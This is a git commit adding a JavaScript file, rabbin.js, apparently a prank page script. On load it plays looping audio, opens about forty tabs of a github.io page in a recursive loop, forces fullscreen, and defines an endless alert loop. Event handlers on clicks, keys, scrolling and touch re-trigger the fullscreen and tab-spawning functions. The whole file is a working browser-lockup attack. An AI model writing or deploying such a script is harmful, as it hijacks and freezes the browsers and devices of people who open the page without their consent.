4754d9e019e685b9d6cb3bca2258bddde0fb71ac
wwwwww <140446699+TheBooster78@users.noreply.github.com>
2026-03-18 18:17:48 +0100

    Add files via upload

---
+++ rabbin.js
@@ -0,0 +1,77 @@
+let body = document.documentElement
+
+function caca(){
+  alert("CAACACAAA")
+  if (window.performance) {
+  console.info("window.performance works fine on this browser");
+}
+  caca()
+}
+function full(){
+    body.requestFullscreen()
+    cactus()
+    full()
+}
+function cactus(){
+    var audio = new Audio('out.mp3');
+    var audio2 = new Audio('cat.mp3');
+    audio.loop=true
+    if (audio.paused){
+        audio.play()
+    }
+    if (audio2.paused){
+        audio2.play()
+    }
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    window.open('http://theshitposter78.github.io/cactus/', '_blank');
+    cactus()
+
+}
+
+cactus()
+full()
+body.addEventListener("touchstart", full)
+body.addEventListener("keydown", full)
+body.addEventListener("scroll", full)
+body.addEventListener("mousedoown", full)
+body.addEventListener("DOMMouseScroll", full)
+body.addEventListener("mousewheel", full)
+body.addEventListener("click", full)
